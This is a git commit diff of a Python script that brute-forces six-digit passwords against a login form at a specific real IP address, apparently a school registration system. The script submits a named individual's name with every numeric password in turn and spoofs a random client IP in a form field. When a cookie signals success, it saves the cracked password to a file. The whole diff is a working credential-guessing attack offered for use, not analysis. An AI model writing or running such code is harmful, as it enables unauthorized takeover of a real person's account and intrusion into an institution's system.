ebd4a56e6e62aed39a22d4deaf85c41453969b08
yoni13 <76271912+yoni13@users.noreply.github.com>
2022-10-10 11:59:53 +0800

    Add files via upload

--- main.py
+++ main.py
@@ -1,19 +1,9 @@
-import requests
-import pymongo
-import dotenv
-import os
-import random
+import requests,os,random,time
 from faker import Faker  
 faker = Faker()
-dotenv.load_dotenv(override=True)
-# Connect to MongoDB
-'''
-client = pymongo.MongoClient(os.getenv('db'))
-failed = client['failed'].failed
-success = client['success'].success
-
-'''
-header = {
+passwd = 0
+while True:
+    header = {
 	'User-Agent':'Mozilla/5.0 (Linux; Android 12; SM-P613) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
 	'Upgrade-Insecure-Requests':'1',
 	'Referer':'http://140.126.151.12/csnskj/Permain.asp',
@@ -26,20 +16,42 @@ header = {
 	'Accept-Language':'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7',
 	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
 	'Accept-Encoding': 'gzip, deflate'
-}
-def run():
-    global header
-    radom = ''.join(["{}".format(random.randint(0, 9)) for num in range(0, 6)])
+    }
+    if len(str(passwd)) == 1:
+    	spasswd = '00000' + str(passwd)
+    if len(str(passwd)) == 2:
+    	spasswd = '0000' + str(passwd)
+    if len(str(passwd)) == 3:
+    	spasswd = '000' + str(passwd)
+    if len(str(passwd)) == 4:
+    	spasswd = '00' + str(passwd)
+    if len(str(passwd)) == 5:
+    	spasswd = '0' + str(passwd)
+    if passwd > 1000000:
+    	break
     r = requests.post('http://140.126.151.12/csnskj/Reg_Per.ASP',data={
     'SCH_NO':'',
     'Time':'',
     'LEVEL':'0',
     'REMOTE_HOST':str(faker.ipv4()),
     'txtT_NO':'',
-    'txtName':os.getenv('name'),
-    'txtPass':os.getenv('passwd')
+    'txtName':'吳俊翰'.encode('big5'),
+    'txtPass':spasswd
     },headers=header,allow_redirects=False)
     r.encoding = 'big5'
-    print(r.headers)
-    print(r.text)
-run()    
+    rheader = r.headers['Set-Cookie']
+    if 'mPass' in rheader:
+    	#we fuck out the real passwd
+    	file = open('passwd.txt','a+')
+    	file.write(str(spasswd)+'\n')
+    	file.close()
+    	print('passwd is ' +passwd)
+    	break
+    else:
+    	#not yet
+    	file = open('failed.txt','a+')
+    	file.write(str(spasswd)+'\n')
+    	file.close()
+    	passwd += 1
+    	print(spasswd)
+    	time.sleep(0.03)
